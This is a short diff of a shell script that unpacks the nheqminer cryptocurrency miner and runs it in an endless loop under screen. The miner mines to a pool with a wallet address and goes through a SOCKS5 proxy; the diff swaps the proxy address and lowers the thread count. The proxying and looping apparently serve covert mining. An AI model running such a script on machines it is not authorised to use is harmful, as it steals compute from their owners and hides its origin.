@@ -7,6 +7,6 @@ tar xf nheqminer-Linux-v0.8.2.tgz
 tar xf nheqminer-Linux-v0.8.2.tar.gz 
 cd nheqminer
 while [ 2 ]; do
-screen ./nheqminer -v -l ap.luckpool.net:3956 -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB -p x -t 36 --proxy socks5://98.175.31.195:4145
+screen ./nheqminer -v -l ap.luckpool.net:3956 -u RYJDLYsGHZZTBQg7RxEi3j4Cx2fZGpVX5p.STB -p x -t 34 --proxy socks5://135.181.218.111:10237
 done
 exit
